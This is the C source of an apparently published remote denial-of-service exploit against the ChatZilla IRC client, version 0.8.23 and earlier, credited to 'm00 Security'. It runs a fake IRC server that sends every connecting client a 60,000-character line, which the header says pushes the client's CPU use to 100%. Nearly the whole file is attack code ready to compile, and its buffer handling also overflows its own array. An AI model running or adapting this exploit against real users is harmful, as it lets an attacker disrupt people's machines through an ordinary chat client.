/*
 *  ChatZilla <=v0.8.23 remote DoS exploit
 *
 *  by m00 Security // www.m00security.org
 *
 *  This sploit creats a fake irc-server on any port. Every connected
 *  ChatZilla-client will have cpu-usage 100%.
 *
 *  Complete advisory:
 *  www.m00security.org/adv/adv003.txt
 *
 *  -d4rkgr3y [d4rk@securitylab.ru]
 */

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<signal.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define COUNT 60000
#define request "NOTICE AUTH :*** Welcome to fake m00 IRCd\n"

int main(int argc, char **argv)
{
        struct sockaddr_in db;
        int sock, i, len, lame;
        const c = COUNT;
        char buf[60000] = ":Serv 000 user666 :Welcome to the underworld";
        printf("\nChatZilla <=v0.8.23 remote DoS exploit // 
www.m00security.org\n\n");
        if (argc!=2){
                printf("[-] error in params. Usage\n %s port\n",argv[0]);
                exit(1);
        } else {
                printf("[~] Generating evil buf....");
        }
        /* constructing evil buf */
        for (i=0;i<c;i++)
        {
                strcat(buf,"A");
        }
        strcat(buf,"\n");
        printf(" OK\n");
        /* creating fake irc-server */
        db.sin_family = AF_INET;
        db.sin_addr.s_addr = INADDR_ANY;
        db.sin_port = htons(atoi(argv[1]));
        sock = socket(PF_INET, SOCK_STREAM, 0);
        if(bind(sock, (struct sockaddr*)&db, sizeof(db)) == -1) {
                perror("[-] bind()");
                _exit(0);
        }
        /* OK */
        printf("[+] fake ircd created on port %s\n",argv[1]);
        /* waiting for connect */
        listen(sock, SOMAXCONN);
        while(1) {
                printf("[+] User connected. Attacking....");
                len = sizeof(db);
                lame = accept(sock, (struct sockaddr*)&db, &len);
                /* go go go */
                write(lame,request,strlen(request));
                write(lame,buf,strlen(buf));
                printf(" OK\n");
                close(lame);
                close(sock);
                return(0);
        }
}

